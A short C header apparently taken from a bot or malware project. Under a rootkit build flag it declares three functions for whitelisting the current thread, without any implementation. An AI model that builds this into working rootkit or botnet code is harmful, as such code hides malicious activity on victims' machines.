#pragma once
#include "modules.h"

#ifdef MODULE_ROOTKIT
#include "bot_structs.h"

void WINAPI AddWhitelistCurrentThread(void);
void WINAPI RemoveWhitelistCurrentThread(void);
BOOL WINAPI IsCurrentThreadWhitelisted();
#endif